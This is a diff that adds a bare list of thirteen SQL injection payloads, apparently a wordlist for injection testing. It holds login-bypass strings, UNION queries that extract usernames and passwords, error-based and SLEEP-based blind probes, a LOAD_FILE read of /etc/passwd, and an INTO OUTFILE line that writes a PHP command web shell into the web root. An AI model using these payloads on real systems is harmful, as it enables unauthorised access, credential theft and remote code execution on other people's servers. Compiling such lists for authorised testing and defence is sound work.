@@ -1,0 +1,13 @@
+' OR '1'='1
+" OR "1"="1
+' OR 1=1 -- 
+admin' --
+admin" --
+1' OR '1'='1' --
+' UNION SELECT NULL, NULL, NULL -- 
+' UNION SELECT username, password, NULL FROM users -- 
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- 
+' OR IF(1=1, SLEEP(5), 0) -- 
+' AND (SELECT * FROM (SELECT(SLEEP(5)))abc) -- 
+' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL -- 
+' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>' -- 
